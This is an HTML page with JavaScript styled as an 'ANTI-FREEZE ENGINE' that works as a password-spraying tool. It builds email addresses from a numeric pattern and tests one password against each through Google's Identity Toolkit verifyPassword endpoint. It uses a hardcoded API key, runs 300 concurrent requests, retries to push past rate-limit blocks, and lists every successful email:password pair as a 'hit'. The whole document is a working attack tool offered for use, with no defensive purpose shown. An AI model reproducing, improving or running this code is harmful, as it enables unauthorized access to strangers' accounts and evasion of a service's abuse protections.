<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANTI-FREEZE SEQUENTIAL</title>
    <style>
        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; margin: 0; padding: 15px; text-align: center; }
        .core { max-width: 600px; margin: auto; border: 2px solid #00ffcc; background: #050a0a; padding: 25px; box-shadow: 0 0 40px rgba(0, 255, 204, 0.3); border-radius: 10px; }
        
        h1 { font-size: 22px; color: #fff; margin: 0 0 10px 0; letter-spacing: 2px; }
        
        input { width: 100%; padding: 15px; margin: 8px 0; background: #001111; border: 1px solid #00ffcc; color: #fff; font-size: 16px; text-align: center; outline: none; border-radius: 5px; }
        
        .btn { width: 100%; padding: 20px; background: #00ffcc; color: #000; border: none; font-weight: bold; font-size: 20px; cursor: pointer; margin-top: 15px; border-radius: 5px; text-transform: uppercase; }
        
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
        .box { background: #000; padding: 15px; border: 1px solid #00ffcc; border-radius: 5px; }
        .box b { font-size: 35px; color: #fff; display: block; }
        .box span { font-size: 12px; color: #00ffcc; }

        #tracker { font-size: 14px; color: #ffeb3b; font-weight: bold; margin-bottom: 15px; background: #222; padding: 10px; border: 1px dashed #ffeb3b; border-radius: 5px; }
        
        #res { width: 100%; height: 300px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 14px; margin-top: 10px; border-radius: 5px; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="core">
    <h1>🚀 ANTI-FREEZE ENGINE V14</h1>
    
    <div id="tracker">STATUS: AWAITING COMMAND...</div>
    
    <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
    <input type="text" id="pwd" placeholder="PASSWORD">
    
    <button class="btn" id="btn" onclick="startScan()">⚡ ENGAGE SMART SCAN</button>

    <div class="grid">
        <div class="box"><span>VERIFIED (1,2,3)</span><b id="c">0</b></div>
        <div class="box"><span>FOUND HITS</span><b id="f">0</b></div>
    </div>

    <textarea id="res" readonly placeholder="Sequential hits will appear here..."></textarea>
</div>

<script>
    let active = false;
    let checked = 0;
    let found = 0;
    let index = 0;
    let head = 0; 
    let activeWorkers = 0;
    const CONCURRENCY = 300; // Optimal for browsers (Won't freeze)
    
    let buffer = {}; 
    let uiBuffer = ""; 
    let startTime;
    
    const beep = new Audio('https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg');

    async function startScan() {
        if (active) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Fill everything!");

        active = true;
        startTime = Date.now();
        document.getElementById('btn').innerText = "🛑 ABORT MISSION";
        document.getElementById('btn').style.background = "#ff0055";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        function pump() {
            while (activeWorkers < CONCURRENCY && index < max) {
                let cur = index++;
                activeWorkers++;
                checkAcc(fmt, pwd, key, cur, digits);
            }
        }

        pump();

        // UI Updater - Runs every 500ms
        setInterval(() => {
            if (!active) return;
            
            document.getElementById('c').innerText = checked;
            let elapsed = (Date.now() - startTime) / 1000;
            let speed = Math.round(checked / elapsed);
            
            // Show exactly where the system is currently looking or blocked
            let statusText = `SPEED: ${speed} REQ/SEC | WAITING FOR: ${head.toString().padStart(digits, '0')}`;
            document.getElementById('tracker').innerText = statusText;

            if (uiBuffer !== "") {
                let rBox = document.getElementById('res');
                rBox.value += uiBuffer;
                rBox.scrollTop = rBox.scrollHeight;
                uiBuffer = "";
            }
        }, 500);
        
        async function checkAcc(fmt, pwd, key, idx, digits) {
            let email = fmt.replace(/\{(\d+)\}/, idx.toString().padStart(digits, '0'));
            
            try {
                let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
                    method: 'POST',
                    body: JSON.stringify({ email: email, password: pwd, returnSecureToken: true }),
                    headers: { 'Content-Type': 'application/json' }
                });
                
                if (r.status === 429) {
                    // Blocked - wait a little longer to unfreeze
                    if (idx === head) document.getElementById('tracker').innerText = `BLOCKED AT: ${email} - RETRYING!`;
                    await new Promise(res => setTimeout(res, 2000));
                    return checkAcc(fmt, pwd, key, idx, digits); 
                }

                let d = await r.json();
                buffer[idx] = { ok: (d && d.idToken), mail: email };

                // ATOMIC FLUSH (1, 2, 3... ONLY)
                while (buffer[head] !== undefined) {
                    let data = buffer[head];
                    if (data.ok) {
                        found++;
                        document.getElementById('f').innerText = found;
                        uiBuffer += data.mail + ":" + pwd + "\n"; 
                        beep.play().catch(()=>{}); 
                    }
                    
                    delete buffer[head]; 
                    head++;
                    checked++;
                }

                activeWorkers--;
                pump(); 

            } catch (e) {
                // Network error - slow down retry to avoid freezing browser
                if (idx === head) document.getElementById('tracker').innerText = `NET ERROR AT: ${email} - RETRYING!`;
                await new Promise(res => setTimeout(res, 1000));
                return checkAcc(fmt, pwd, key, idx, digits); 
            }
        }
    }
</script>
</body>
</html>
